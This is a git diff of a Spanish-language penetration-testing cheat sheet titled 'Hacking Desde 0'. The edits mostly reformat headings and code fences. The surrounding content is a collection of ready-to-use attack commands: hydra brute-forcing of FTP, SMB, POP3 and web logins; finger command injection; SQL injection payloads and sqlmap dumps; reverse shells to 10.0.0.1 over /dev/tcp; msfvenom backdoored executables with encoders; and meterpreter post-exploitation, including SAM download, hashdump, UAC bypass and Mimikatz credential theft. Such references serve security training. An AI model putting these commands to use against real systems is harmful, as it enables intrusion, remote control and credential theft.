@@ -45,7 +45,7 @@ Debido al gran contenido que abarca la seguridad informatica, este post esta en 
 
 
 ## Hacking Desde 0
-### Enumeracion Inicial
+## Enumeracion Inicial
 
 ```bash
 # Escaneo sencillo con Nmap 
@@ -62,7 +62,7 @@ nmap -v -Pn -T4 -p- --script vuln -oN machine.nmap 192.168.6.66
 masscan 192.168.6.66 -p0-65535
 ```
 
-### Enumerando FTP  
+## Enumerando FTP  
 
 ```bash
 # Banner grab
@@ -89,7 +89,7 @@ hydra 192.168.6.66 ftp -l username -P /usr/share/wordlists/rockyou.txt -e ns -vV
   - ftp.conf
   - proftpd.conf
 
-### Enumerando SSH  
+## Enumerando SSH  
 
 ```bash
 # Iniciar sesion por SSH
@@ -114,7 +114,7 @@ winscp
   - ssh_known_hosts
   - .shosts
 
-### Enumerando SMTP  
+## Enumerando SMTP  
 
 ```bash
 # Banner grab
@@ -145,7 +145,7 @@ QUIT
 sendmail.cf
 submit.cf  
 
-### Enumerando un sitio WEB
+## Enumerando un sitio WEB
 
 Como realizar un descubrimiento de directorios:  
 
@@ -161,8 +161,11 @@ nikto -h 10.0.0.1
 ```  
 
 **Crackear peticiones GET**  
-# hydra -l username -p wordlist -t thread -vV -e ns IP http-get /admin/
-# hydra -l username -p wordlist -t thread -vV -e ns -f IP http-get /admin/index.php  
+
+```  
+hydra -l username -p wordlist -t thread -vV -e ns IP http-get /admin/
+hydra -l username -p wordlist -t thread -vV -e ns -f IP http-get /admin/index.php  
+```  
 
 **Crackear peticiones POST**  
 *Ejemplo de formulario WEB a crackear*  
@@ -176,7 +179,7 @@ nikto -h 10.0.0.1
 ```  
 
 Commando para Cracking de formularios POST：  
-# hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>”
+hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^ <title>invalido</title>”
 
 **Herramientas Utiles**  
 Burpsuite
@@ -199,7 +202,7 @@ Wordpress
   - setup-config.php
   - wp-config.php
 
-### Enumerando SMB
+## Enumerando SMB
 
 ```  
 enum4linux –a 10.0.0.1
@@ -237,7 +240,7 @@ hydra -l administrator -P pass.txt IP smb
 Smb.conf
 lmhosts
 
-### Enumerando Finger
+## Enumerando Finger
 
 Descargar el siguiente script para enumerar este servicio:  
 http://pentestmonkey.net/tools/user-enumeration/finger-user-enum
@@ -260,7 +263,7 @@ finger "|/bin/id@example.com"
 finger "|/bin/ls -a /@example.com"
 ```  
 
-### Enumerando POP3
+## Enumerando POP3
 
 ```  
 telnet INSERTIPADDRESS 110
@@ -282,7 +285,7 @@ nmap -p110 –script pop3-capabilities target
 hydra -l muts -P pass.txt my.pop3.mail pop3
 ```  
 
-### Enumerando SNMP
+## Enumerando SNMP
 
 ```  
 snmpwalk -c public -v1 10.0.0.0
@@ -309,7 +312,7 @@ snmp.conf
 snmpd.conf
 snmp-config.xml  
 
-### Enumerando MySQL
+## Enumerando MySQL
 
 ```  
 mysql -h <Hostname> -u root@localhost
@@ -374,7 +377,7 @@ mysql> \! cat /etc/passwd
 mysql> \! bash
 ```  
 
-### Enumerando Oracle
+## Enumerando Oracle
 
 ```  
 tnscmd10g version -h INSERTIPADDRESS
@@ -387,7 +390,7 @@ tnscmd10g status -h INSERTIPADDRESS
 http://www.vulnerabilityassessment.co.uk/default_oracle_passwords.htm
 ```  
 
-### SQLInjections
+## SQLInjections
 
 **Inyeccion en formularios de inicio de sesion** 
 
@@ -408,7 +411,7 @@ admin'/*
 sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
 ```  
 
-### DSN Zone Transfers
+## DSN Zone Transfers
 
 ```  
 nslookup -> set type=any -> ls -d blah.com
@@ -428,7 +431,7 @@ dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
 dnsenum --noreverse -o mydomain.xml example.com
 ```  
 
-### Mounting File Shares
+## Mounting File Shares
 
 ```  
 showmount -e IPADDR
@@ -451,7 +454,7 @@ Montando recursos compartidos en Windows.
 net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no
 ```  
 
-### Tecnicas de Fingerprinting
+## Tecnicas de Fingerprinting
 
 ```  
 nc -v 192.168.1.1 25
@@ -465,7 +468,7 @@ telnet 192.168.1.1 25
 nmap -o -v binarychaos.com
 ```  
 
-### Busqueda de Exploits
+## Busqueda de Exploits
 
 En el siguiente ejemplo realizo una busqueda de exploits relacionados a windows 2003  
 
@@ -474,7 +477,7 @@ searchsploit windows 2003 | grep -i local
 ```  
 
 
-### Compilando Exploits
+## Compilando Exploits
 
 ```  
 gcc -o exploit exploit.c
@@ -485,7 +488,7 @@ i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
 ```  
 
 
-### Sniffer Trafic
+## Sniffer Trafic
 
 En el siguiente comando, realizo un capturo los paquetes del puerto 80 por el protocolo TCP por medio de la interfaz eth0 y exporto el resultado en un archivo con nombre *output.pcap*.  
 
@@ -493,7 +496,7 @@ En el siguiente comando, realizo un capturo los paquetes del puerto 80 por el pr
 tcpdump tcp port 80 -w output.pcap -i eth0
 ```  
 
-### Password Cracking
+## Password Cracking
 
 Para la identificacion del tipo de hash utilizar:  
 
@@ -514,7 +517,7 @@ Lista de tipos de hash soportados por Hashcat:
 https://hashcat.net/wiki/doku.php?id=example_hashes 
 ```  
 
-### Bruteforcing
+## Bruteforcing
 
 **Ejemplos del uso de Hydra**  
 *Fuerza bruta a formulario enviado por Peticion POST*    
@@ -589,7 +592,7 @@ for i in {0..9}; do echo Th4C00lTheacha$i; done >> hoola.txt
 ```  
 
 
-### Shell-Reverse
+## Shell-Reverse
 
 **BASH**
 ```bash  
@@ -638,7 +641,7 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```  
 
-### Obtener Shell TTY interactiva
+## Obtener Shell TTY interactiva
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
@@ -675,11 +678,11 @@ Usando man, more, less
 !bash
 ```
 
-### Metasploit
+## Metasploit
 
 **Generacion de payloads con msfvenom**  
 
-#### Web Payloads
+### Web Payloads
 
 | Comandos         | Explicacion                                                                 |
 | --------         | ------------------------------------------------------------------          |
@@ -688,7 +691,7 @@ Usando man, more, less
 | msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.jsp | Creats a Creacion del Shell Inversa para JSP por el protocolo TCP
 | msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war | Creacion del Shell Inversa para WAR por el protocolo TCP |
 
-#### Windows Payloads
+### Windows Payloads
 
 | Comandos         | Explicacion                                                                 |
 | --------         | ------------------------------------------------------------------          |
@@ -697,7 +700,7 @@ Usando man, more, less
 | msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe | Crea una carga útil simple para el protocolo TCP con el codificador shikata_ga_nai
 | msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe | Enlazar un ejecutable con un backdoor y lo codifica con shikata_ga_nai |
 
-#### Binaries
+### Binaries
 
 | Comandos         | Explicacion                                                                 |
 | --------         | ------------------------------------------------------------------          |
@@ -726,65 +729,105 @@ msf5 exploit(multi/handler) > run
 
 Luego de comprometer una maquina y tener una shell de meterpreter, hay multiples comandos que nos facilitaran la vida en la hora de interactuar con nuestra maquina victima.  
 
+```  
 upload file c:\\windows
+```  
 Como subir un archivo a una maquina comprometida con windows
 
+```  
 download c:\\windows\\repair\\sam /tmp
+```  
 Como descargar un archivo que este alojado en el equipo victima y guardarlo en nuestro equipo.
 
+```  
 execute -f c:\\windows\temp\exploit.exe
+```  
 Como ejecutar archivos (EXE) alojados en la maquina comprometida.  
 *Esto es util para la ejecucion de exploits.*
 
+```  
 execute -f cmd -c
+```  
 Crea un nuevo canal con una Shell de CMD
 
+```  
 ps
+```  
 Como ver los procesos que corre nuestra maquina comprometida.  
 
+```  
 shell
+```  
 Como obtener una shell en la maquina comprometida.  
 
+```  
 getsystem
+```  
 Realizar un intento para escalar privilegios sobre el sistema.  
 
+```  
 hashdump
+```  
 El comando hashdump permite obtener los usuarios y el hash de los passwords de la maquina remota en formato SAM, de esta forma se puede crakear la clave de un usuario determinado usando herramientas como john the ripper o ophcrack
 
+```  
 portfwd add -l 3389 -p 3389 -r target
+```  
 Como redirigir puertos a través de la máquina comprometida hacia nosotros los atacantes.
 
+```  
 portfwd delete -l 3389 -p 3389 -r target
+```  
 Eliminar la redireccion de puertos.
 
+```  
 use exploit/windows/local/bypassuac
+```  
 Burlar el Control de Cuentas de Usuario (UAC) en Windows 7 // Indicar la IP de la victima como target + arch, x86/64
 
+```  
 use auxiliary/scanner/http/dir_scanner
+```  
 Analizador de directorios HTTP
 
+```  
 use auxiliary/scanner/http/jboss_vulnscan
+```  
 Escaner de vulnerabilidades para JBOSS
 
+```  
 use auxiliary/scanner/mssql/mssql_login
+```  
 Modulo para autenticarse en el servicio MSSQL.
 
+```  
 use auxiliary/scanner/mysql/mysql_version
+```  
 Identificar la version de MySQL.
 
+```  
 use auxiliary/scanner/oracle/oracle_login
+```  
 Modulo para autenticarse en el servicio de Oracle
 
+```  
 post/windows/manage/powershell/exec_powershell
+```  
 Ejecucion de script en powershell para una sesion de meterpreter
 
+```  
 run post/windows/gather/win_privs
+```  
 Ver privilegios del usuario actual.
 
+```  
 use post/windows/gather/credentials/gpp
+```  
 Obtener contraseñas guardadas GPP
 
+```  
 load kiwi
 creds_all
+```  
 Cargar Mimikatz/kiwi para conseguir credenciales de usuarios autenticados.
 
